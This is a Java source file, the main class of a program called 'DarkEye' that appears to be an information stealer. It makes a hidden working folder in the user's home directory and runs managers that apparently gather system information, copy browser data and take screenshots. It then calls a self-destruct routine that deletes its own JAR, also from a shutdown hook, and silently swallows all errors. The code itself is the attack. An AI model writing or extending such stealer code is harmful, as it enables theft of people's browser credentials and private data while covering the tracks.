package org.spray.darkeye;

import java.io.File;

import org.spray.darkeye.managers.BrowserManager;
import org.spray.darkeye.managers.CopyManager;
import org.spray.darkeye.managers.InfoManager;
import org.spray.darkeye.managers.ScreenManager;
import org.spray.darkeye.utils.FileUtils;

public class DarkEye {

	private static InfoManager infoManager;
	private static CopyManager browserManager;
	private static ScreenManager screenManager;

	public static void main(String[] args) {
		start();

		// If the process is closed before the end of the work
		Runtime.getRuntime().addShutdownHook(new Thread(() -> {
			try {
				FileUtils.seldDestructionJar();
			} catch (Exception e) {
			}
		}));
	}

	public static void start() {
		// DEMO
		File tempFile = new File(System.getProperty("user.home"), "DarkEye");
		if (!tempFile.exists())
			tempFile.mkdir();

		try {
			infoManager = new InfoManager(tempFile.getAbsolutePath());
			browserManager = new BrowserManager(tempFile.getAbsolutePath());
			screenManager = new ScreenManager(tempFile.getAbsolutePath());

			infoManager.run();
			browserManager.run();
			screenManager.run();
		} catch (Exception e) {
		}

		try {
			FileUtils.seldDestructionJar();
		} catch (Exception e) {
		}

	}
}